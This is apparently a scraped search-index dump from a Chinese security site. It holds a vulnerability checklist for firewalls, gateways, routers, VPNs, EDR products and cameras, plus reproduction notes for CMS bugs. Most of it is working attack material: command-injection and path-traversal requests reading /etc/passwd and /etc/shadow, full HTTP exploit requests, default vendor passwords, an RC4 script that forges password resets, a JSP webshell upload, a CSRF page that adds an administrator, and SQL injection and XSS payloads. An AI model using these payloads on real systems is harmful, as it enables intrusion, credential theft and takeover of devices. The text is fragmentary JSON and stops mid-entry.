{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd \u003e/var/www/html/test_test.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"} 访问： https://x.x.x.x/test_test.txt 启明星辰 天清汉马USG防火墙 默认口令 useradmin/venus.user 佑友防火墙 默认口令 admin/hicomadmin 后台命令执行 系统管理 --\u003e 维护工具 --\u003e Ping 127.0.0.1|cat /etc/passwd ZeroShell FOFA： app=\"Zeroshell-防火墙\" ZeroShell 3.9.0 cgi-bin/kerbynet 命令执行 exp： https://www.exploit-db.com/exploits/49096 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:3","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x04 网关 奇安信 网康 NS-ASG 安全网关 FOFA： 网康 NS-ASG 安全网关 任意文件读取 ✅ /admin/cert_download.php?file=pqpqpqpq.txt\u0026certfile=../../../../../../../../etc/passwd 安恒 明御安全网关 命令执行/任意文件读取✅ 漏洞指纹： /webui/?g=aaa_portal_auth_local_submit\u0026suffix= /webui/?g=sys_dia_data_down\u0026file_name= /webui/?g=sys_dia_data_check\u0026file_name= ... 锐捷 EG 易网关 管理员账号密码泄露 ✅ 获取账号密码： POST /login.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip username=admin\u0026password=admin?show+webmaster+user branch_passw.php 远程命令执行 ✅ 发送请求包： POST /itbox_pi/branch_passw.php?a=set HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 41 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=52222egp72ilkpf2de7qbrigk3;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip pass=|cat /etc/psswd\u003e../test_test.txt 再访问： http://your-ip/test_test.txt cli.php 远程命令执行 ✅ 发送请求包： POST /cli.php?a=shell HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 24 Content-Type: application/x-www-form-urlencoded Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; X-Requested-With: XMLHttpRequest Accept-Encoding: gzip notdelay=true\u0026command=id download.php 任意文件读取 ✅ poc： /download.php?a=read_txt\u0026file=../../../../etc/passwd 锐捷 ISG 视频接入安全网关 账号密码泄露漏洞 ✅ FOFA： title=\"RG-ISG\" F12 查看到账号密码，解密md5 后登陆系统。 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:4","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x05 路由器 D-Link DAP-2020 FOFA： body=\"DAP-1360\" \u0026\u0026 body=\"6.05\" webproc 任意文件读取 CVE-2021-27250 ✅ poc： POST /cgi-bin/webproc getpage=html%2Findex.html\u0026errorpage=/etc/passwd\u0026var%3Amenu=setup\u0026var%3Apage=wizard\u0026var%3Alogin=true\u0026obj-action=auth\u0026%3Ausername=admin\u0026%3Apassword=123\u0026%3Aaction=login\u0026%3Asessionid=3c1f7123 H3C 企业路由器（ER、ERG2、GR系列） 任意用户登录漏洞 ✅ 攻击者可通过访问 /userLogin.asp/../actionpolicy_status/../xxxx.cfg 接口，xxxx 为设备型号（比如设备型号为 ER5200G2，即访问 /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg），绕过 COOKIE 验证，进行目录穿越，获取设备的明文配置文件。 配置中有明文的 Web 管理员账号 admin 密码，登录后台可通过开启 telnet 获取命令执行权限。 iKuai 路由器 FOFA： title=\"登录爱快流控路由\" 后台任意文件读取✅ 默认密码：admin/admin poc： GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1 Host： .... 流控路由 SQL注入漏洞✅ 万能密码登录： user: \"or\"\"=\"\"or\"\"=\" pass: 空 锐捷 NBR路由器 远程命令执行漏洞 CNVD-2021-09650 ✅ FOFA： title=\"锐捷网络-EWEB网管系统\" icon_hash=\"-692947551\" 构造命令执行： POST /guest_auth/guestIsUp.php mac=1\u0026ip=127.0.0.1|cat /etc/passwd \u003e test.txt 再访问： /guest_auth/test.txt ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:5","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x06 负载均衡 Citrix ADC 默认口令 nsroot/nsroot 远程代码执行 CVE-2019-19781 访问以下链接，返回403则表示不存在漏洞，返回smb.conf则证明漏洞存在。 curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is 或 curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure exp： https://github.com/trustedsec/cve-2019-19781 https://github.com/jas502n/CVE-2019-19781 F5 BIG-IP 远程代码执行 CVE-2020-5902 exp： https://github.com/jas502n/CVE-2020-5902 https://github.com/theLSA/f5-bigip-rce-cve-2020-5902 远程代码执行 CVE-2021-22986 POST /mgmt/tm/util/bash HTTP/1.1 Host: your_ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 41 {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} exp： https://github.com/h4x0r-dz/RCE-Exploit-in-BIG-IP https://github.com/Al1ex/CVE-2021-22986 天融信 Top-app LB SQL注入 POST /acc/clsf/report/datasource.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded t=l\u0026e=0\u0026s=t\u0026l=1\u0026vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- \u0026o=r_Speed\u0026gid=0\u0026lmt=10\u0026asc=false\u0026p=8\u0026lipf=\u0026lipt=\u0026ripf=\u0026ript=\u0026dscp=\u0026proto=\u0026lpf=\u0026lpt=\u0026rpf=\u0026rpt= 无密码登录 任意用户名 密码：;id ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:6","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x07 VPN Fortigate SSL VPN FOFA： fofa: icon_hash=\"-404383634\" app=\"FORTINET-防火墙\" 密码读取 CVE-2018-13379 exp：https://github.com/milo2012/CVE-2018-13379 任意密码重置 CVE-2018-13382 exp：https://github.com/milo2012/CVE-2018-13382 认证绕过 CVE-2022-40684 exp：https://github.com/horizon3ai/CVE-2022-40684 git clone https://github.com/horizon3ai/CVE-2022-40684.git cd CVE-2022-40684 ssh-keygen -t rsa python3 CVE-2022-40684.py -t 1.1.1.1 --username admin --key-file ~/.ssh/id_rsa.pub ssh admin@1.1.1.1 Palo Alto SSL VPN GlobalProtect 远程代码执行 CVE-2019-1579 exp：https://github.com/securifera/CVE-2019-1579 Pulse Secure SSL VPN 任意文件读取 CVE-2019-11510 exp：https://github.com/projectzeroindia/CVE-2019-11510 远程代码执行 CVE-2019-11539 exp：https://github.com/0xDezzy/CVE-2019-11539 深信服 VPN 常见密码 admin/sangfor@123 sangfor/sangfor test/test test1/123456b 口令爆破 用户登录，若多次尝试登录失败会要求输入验证码，若输入错误的验证码，会提示“校验码错误或校验码已过期”；修改登录请求的数据包，清空cookie和验证码字段的值即可绕过验证码，此时提示“用户名或密码错误”。 /por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd= 短信绕过 POST https://ip/por/changetelnum.csp?apiversion=1 newtel=TARGET_PHONE\u0026sessReq=clusterd\u0026username=TARGET_USERNAME\u0026grpid=0\u0026sessid=0\u0026ip=127.0.0.1 任意密码重置 加密算法使用了默认的key，攻击者构利用key构造重置密码数据包从而修改任意用户的密码。利用需要登陆账号。 M7.6.6R1版本key为20181118 M7.6.1key为20100720 POST /por/changepwd.csp sessReq=clusterd\u0026sessid=0\u0026str=RC4_STR\u0026len=RC4_STR_LEN(脚本计算后结果) from Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data, key): rc41= ARC4.new(key) encrypted =rc41.encrypt(data) return encrypted. encode('hex') def rc4_decrpt_hex(data, key): rc41= ARC4. new(key) return rc41. decrypt(a2b_hex(data)) key= '20100720' data = r',username-TARGET_USERNAME, ip-127.0.0.1,grpid-1, pripsw-suiyi , newpsw=TARGET PASSWORD,' print myRC4(data, key) 锐捷 SSL VPN FOFA： icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" 越权访问 UserName 参数为已知用户名 GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Cookie: UserName=admin; SessionId=1; FirstVist=1; Skin=1; tunnel=1 Juniper SSL VPN Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:2:7","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"三、终端响应与检测 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 EDR/杀软 深信服 EDR 命令执行1 exp：https://github.com/BH2UOL/sangfor-edr-exploit 命令执行2 POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 {\"params\":\"w=123\\\"'1234123'\\\"|命令\"} 后台任意用户登录 xxx.xxx.xxx.xxx/ui/login.php?user=admin 360天擎 FOFA： title=\"360天擎\" 前台SQL注入 /api/dp/rptsvcsyncpoint?ccid=1 数据库信息泄露 http://x.x.x.x/api/dbstat/gettablessize 金山 V8 终端安全系统 FOFA： title=\"在线安装-V8+终端安全系统Web控制台\" 任意文件读取 /htmltopdf/downfile.php?filename=downfile.php pdf_maker.php 命令执行 POST /inter/pdf_maker.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D\u0026fileName=xxx 金山 VGM防毒墙 FOFA： \"金山VGM\" downFile.php 任意文件读取 poc： /downFile.php?filename=../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:3:1","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 数据防泄漏系统 天融信数据防泄漏系统 越权修改管理员密码 无需登录权限,由于修改密码处未校验原密码,且 /?module=auth_user\u0026action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。 默认 superman 账户 uid 为 1。 POST /?module=auth_user\u0026action=mod_edit_pwd Cookie: username=superman; uid=1\u0026pd=Newpasswd\u0026mod_pwd=1\u0026dlp_perm=1 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:3:2","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"四、其他 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x01 网络摄像机 HIKVISION DS/IDS/IPC 等设备 FOFA： \"671-1e0-587ec4a1\" 远程命令执行 CVE-2021-36260 ✅ python CVE-2021-36260.py --rhost 127.0.0.1 --rport 8081 --cmd \"ls\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:4:1","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"0x02 综合管理平台 大华 智慧园区综合管理平台 FOFA： app=\"dahua-智慧园区综合管理平台\" user_save.action 任意文件上传 ✅ 漏洞指纹： POST /admin/user_save.action POST /WPMS/getPublicKey 大华 城市安防监控系统平台管理 FOFA： \"attachment_downloadByUrlAtt.action\" attachment_downloadByUrlAtt.action 任意文件下载 ✅ poc： /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HIKVISION iVMS-8700综合安防管理平台 FOFA： icon_hash=\"-911494769\" 任意文件下载 ✅ 验证POC，token 为 URL md5： /eps/api/triggerSnapshot/download?token=xxx\u0026fileUrl=file:///C:/windows/win.ini\u0026fileName=1 任意文件上传 ✅ 发送请求包上传文件： POST /eps/resourceOperations/upload.action HTTP/1.1 Host: ------WebKitFormBoundaryTJyhtTNqdMNLZLhj Content-Disposition: form-data; name=\"fileUploader\";filename=\"test.jsp\" Content-Type: image/jpeg \u003c%out.print(\"hello\");%\u003e ------WebKitFormBoundaryTJyhtTNqdMNLZLhj-- 访问webshell： /eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/:4:2","tags":null,"title":"","uri":"/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E-checklist/"},{"categories":null,"content":"74cms v4.2.1 v4.2.129 后台getshell漏洞 ","date":"0001-01-01","objectID":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 ","date":"0001-01-01","objectID":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER[‘HTTP_HOST’] 改为 http://baidu.com 即可 ","date":"0001-01-01","objectID":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/:2:1","tags":null,"title":"","uri":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞演示 url: http://74cms.test/index.php?m=Admin\u0026c=Tpl\u0026a=set\u0026tpl_dir= ', 'a',phpinfo(),' shell: http://74cms.test/Application/Home/Conf/config.php 路径： \\74cms\\upload\\Application\\Home\\Conf\\config.php ","date":"0001-01-01","objectID":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/:2:2","tags":null,"title":"","uri":"/74cms-v4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"74cms v5.0.1 后台跨站请求伪造漏洞 CVE-2019-11374 ","date":"0001-01-01","objectID":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/:0:0","tags":null,"title":"","uri":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/"},{"categories":null,"content":"漏洞描述 在74CMS v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：/index.php?m=admin\u0026c=admin\u0026a=add 攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。 ","date":"0001-01-01","objectID":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/:1:0","tags":null,"title":"","uri":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/"},{"categories":null,"content":"漏洞影响 74CMS v5.0.1 ","date":"0001-01-01","objectID":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/:2:0","tags":null,"title":"","uri":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/"},{"categories":null,"content":"漏洞复现 首先我们登录后台页面，并添加管理员，然后添加信息，用burp_suite抓包 当管理员登录后台后，点击攻击者发来的连接即可创建一个新的超级管理员账户 利用exp如下： \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e CSRF \u003c/title\u003e \u003cscript type=\"text/javascript\"\u003e function exec1(){ document.getElementById('form1').submit(); } \u003c/script\u003e \u003c/head\u003e \u003cbody onload=\"exec1();\"\u003e \u003cform id=\"form1\" action=\"https://www.0dayhack.com/index.php?m=Admin\u0026c=admin\u0026a=add\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"username\" value=\"admin688\" /\u003e \u003cinput type=\"hidden\" name=\"email\" value=\"111111111@qq.com\" /\u003e \u003cinput type=\"hidden\" name=\"password\" value=\"admin688\" /\u003e \u003cinput type=\"hidden\" name=\"repassword\" value=\"admin688\" /\u003e \u003cinput type=\"hidden\" name=\"role_id\" value=\"1\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e ","date":"0001-01-01","objectID":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/:3:0","tags":null,"title":"","uri":"/74cms-v5.0.1-%E5%90%8E%E5%8F%B0%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E-cve-2019-11374/"},{"categories":null,"content":"Anchor CMS 0.12.7 跨站请求伪造 CVE-2020-23342 ","date":"0001-01-01","objectID":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/:0:0","tags":null,"title":"","uri":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/"},{"categories":null,"content":"漏洞描述 https://packetstormsecurity.com/files/161048/anchorcms0127-xsrf.txt ","date":"0001-01-01","objectID":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/:1:0","tags":null,"title":"","uri":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/"},{"categories":null,"content":"网络测绘 \"Anchor CMS\" \u0026\u0026 body=\"themes/default/img/favicon.png\" ","date":"0001-01-01","objectID":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/:2:0","tags":null,"title":"","uri":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/"},{"categories":null,"content":"漏洞复现 Anchor CMS使用Get方法进行敏感操作，可以使用exploit.html进行删除用户等操作。 exploit.html： \u003cimg src=\"http://target/anchor/index.php/admin/users/delete/21\"\u003e 当管理员点击时删除ID为21的用户。 ","date":"0001-01-01","objectID":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/:3:0","tags":null,"title":"","uri":"/anchor-cms-0.12.7-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-cve-2020-23342/"},{"categories":null,"content":"AspCMS commentList.asp SQL注入漏洞 ","date":"0001-01-01","objectID":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 AspCMS commentList.asp 存在SQL注入漏洞，攻击者通过漏洞可以获取管理员md5的密码 ","date":"0001-01-01","objectID":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 AspCMS ","date":"0001-01-01","objectID":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"ASPCMS\" ","date":"0001-01-01","objectID":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 通过网站源码响应判断CMS 验证POC /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user 成功获取管理员账号以及密码的MD5 ","date":"0001-01-01","objectID":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/aspcms-commentlist.asp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"BloofoxCMS 0.5.2.1 存储型XSS ","date":"0001-01-01","objectID":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:0:0","tags":null,"title":"","uri":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞描述 参考链接： https://packetstormsecurity.com/files/161195 ","date":"0001-01-01","objectID":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:1:0","tags":null,"title":"","uri":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞影响 BloofoxCMS 0.5.1.0 -.5.2.1 ","date":"0001-01-01","objectID":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:2:0","tags":null,"title":"","uri":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"网络测绘 app=\"BloofoxCMS\" ","date":"0001-01-01","objectID":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:3:0","tags":null,"title":"","uri":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞复现 漏洞文件： /admin/include/inc_content_articles.php 登录有效的账号，在添加文章的时候插入Payload发布，每次访问均可触发： \u003cimg src=# onerror=alert('xss')\u003e ","date":"0001-01-01","objectID":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:4:0","tags":null,"title":"","uri":"/bloofoxcms-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"BSPHP index.php 未授权访问 信息泄露漏洞 ","date":"0001-01-01","objectID":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息 ","date":"0001-01-01","objectID":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 BSPHP ","date":"0001-01-01","objectID":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"BSPHP\" ","date":"0001-01-01","objectID":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问如下URL，泄露用户名与登录IP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin\u0026c=log\u0026a=table_json\u0026json=get\u0026soso_ok=1\u0026t=user_login_log\u0026page=1\u0026limit=10\u0026bsphptime=1600407394176\u0026soso_id=1\u0026soso=\u0026DESC=0‘ ","date":"0001-01-01","objectID":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/bsphp-index.php-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"CmsEasy crossall_act.php SQL注入漏洞 